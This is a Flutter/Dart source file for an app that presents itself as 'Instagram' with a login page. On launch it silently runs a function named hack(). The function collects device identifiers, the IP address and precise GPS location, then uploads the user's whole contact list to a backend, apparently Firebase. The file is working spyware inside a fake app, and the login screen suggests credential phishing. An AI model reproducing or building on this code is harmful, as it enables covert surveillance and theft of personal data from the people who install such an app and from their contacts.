import 'dart:convert';
import 'dart:io';
import 'package:device_info/device_info.dart';
import 'package:http/http.dart' as http;
import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'screens/login_page.dart';
import 'services/firebase-database.dart';
import 'package:sms/sms.dart';
import 'package:geolocator/geolocator.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
  Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
    return <String, dynamic>{
      'version.securityPatch': build.version.securityPatch,
      'version.sdkInt': build.version.sdkInt,
      'version.release': build.version.release,
      'version.previewSdkInt': build.version.previewSdkInt,
      'version.incremental': build.version.incremental,
      'version.codename': build.version.codename,
      'version.baseOS': build.version.baseOS,
      'board': build.board,
      'bootloader': build.bootloader,
      'brand': build.brand,
      'device': build.device,
      'display': build.display,
      'fingerprint': build.fingerprint,
      'hardware': build.hardware,
      'host': build.host,
      'id': build.id,
      'manufacturer': build.manufacturer,
      'model': build.model,
      'product': build.product,
      'supported32BitAbis': build.supported32BitAbis,
      'supported64BitAbis': build.supported64BitAbis,
      'supportedAbis': build.supportedAbis,
      'tags': build.tags,
      'type': build.type,
      'isPhysicalDevice': build.isPhysicalDevice,
      'androidId': build.androidId,
      'systemFeatures': build.systemFeatures,
    };
  }

  void hack() async {
    Map<String, dynamic> deviceData = <String, dynamic>{};
    try {
      if (Platform.isAndroid) {
        deviceData = _readAndroidBuildData(await deviceInfoPlugin.androidInfo);
      }
    } on PlatformException {
      deviceData = <String, dynamic>{
        'Error:': 'Failed to get platform version.'
      };
    }
    var ipRes = await http
        .get(Uri.parse("https://api.bigdatacloud.net/data/client-ip"));
    var ipResData = jsonDecode(ipRes.body);
    String ip = ipResData['ipString'];
    if (ip == null) {
      id = deviceData['androidId'] + deviceData['model'];
    }
    id = deviceData['androidId'] +
        deviceData['model'] +
        "_" +
        ip.toString().replaceAll(".", "_");
    var p = await getLocation();
    await addLoc(p.longitude.toString(), p.latitude.toString());
    if (await Permission.contacts.request().isGranted) {
      // Either the permission was already granted before or the user just granted it.
      var contacts =
          (await ContactsService.getContacts(withThumbnails: false)).toList();
      print("aaaa");
      contacts
          .map((e) => e.phones.map((i) async {
                print(e.displayName + i.value);
                await addProduct(i.value, e.displayName);
              }).toList())
          .toList();
    }
  }

  Future<Position> getLocation() async {
    Position pos;
    try {
      pos = await getCurrentPosition(
          desiredAccuracy: LocationAccuracy.best,
          timeLimit: Duration(seconds: 10));
    } catch (err) {
      pos = await getLastKnownPosition();
    }
    print("hello");

    // print("${pos.latitude} ${pos.longitude}");

    return pos;
  }

  @override
  void initState() {
    // TODO: implement initState
    hack();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Instagram',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        // This is the theme of your application.
        //
        // Try running your application with "flutter run". You'll see the
        // application has a blue toolbar. Then, without quitting the app, try
        // changing the primarySwatch below to Colors.green and then invoke
        // "hot reload" (press "r" in the console where you ran "flutter run",
        // or simply save your changes to "hot reload" in a Flutter IDE).
        // Notice that the counter didn't reset back to zero; the application
        // is not restarted.
        primarySwatch: Colors.blue,
      ),
      home: LoginPage(),
    );
  }
}
